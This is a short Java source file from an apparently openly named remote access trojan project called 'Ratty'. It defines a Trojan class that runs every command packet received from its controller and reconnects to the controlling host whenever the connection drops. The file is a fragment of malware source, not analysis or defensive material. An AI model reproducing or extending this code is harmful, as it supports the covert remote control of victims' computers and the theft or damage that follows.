package de.sogomn.rat;

import de.sogomn.rat.packet.IPacket;

public final class Trojan implements IConnectionObserver {
	
	public Trojan() {
		//...
	}
	
	@Override
	public void packetReceived(final ActiveConnection client, final IPacket packet) {
		packet.execute(client);
	}
	
	@Override
	public void disconnected(final ActiveConnection client) {
		final String address = client.getAddress();
		final int port = client.getPort();
		
		client.setObserver(null);
		
		Ratty.connectToHost(address, port);
	}
	
}
